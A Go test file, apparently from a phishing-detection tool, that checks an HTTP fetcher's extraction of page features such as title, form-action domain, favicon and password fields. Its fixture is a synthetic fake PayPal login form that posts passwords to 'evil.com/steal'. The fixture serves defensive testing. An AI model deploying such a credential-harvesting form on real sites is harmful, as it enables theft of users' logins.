package enricher

import (
	"context"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/require"
)

const syntheticHTML = `<html lang="en">
<head><title>PayPal Login</title>
<link rel="icon" href="https://paypal.com/favicon.ico">
</head>
<body>
<form action="https://evil.com/steal">
<input type="password" name="pass">
<input type="hidden" name="redirect" value="/">
</form>
</body>
</html>`

func TestFetchHTTP_Synthetic(t *testing.T) {
	t.Parallel()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(syntheticHTML))
	}))
	defer srv.Close()

	r := FetchHTTP(context.Background(), srv.URL)

	require.Equal(t, 200, r.StatusCode)
	require.Equal(t, "PayPal Login", r.Title)
	require.Equal(t, "en", r.Language)
	require.Equal(t, "evil.com", r.FormActionDomain)
	require.Contains(t, r.FaviconURL, "paypal.com")
	require.Equal(t, 1, r.PasswordFieldCount)
	require.True(t, r.HasHiddenRedirect)
}

func TestFetchHTTP_Unreachable(t *testing.T) {
	t.Parallel()
	r := FetchHTTP(context.Background(), "http://127.0.0.1:19999/no-server-here")
	require.Equal(t, 0, r.StatusCode)
}
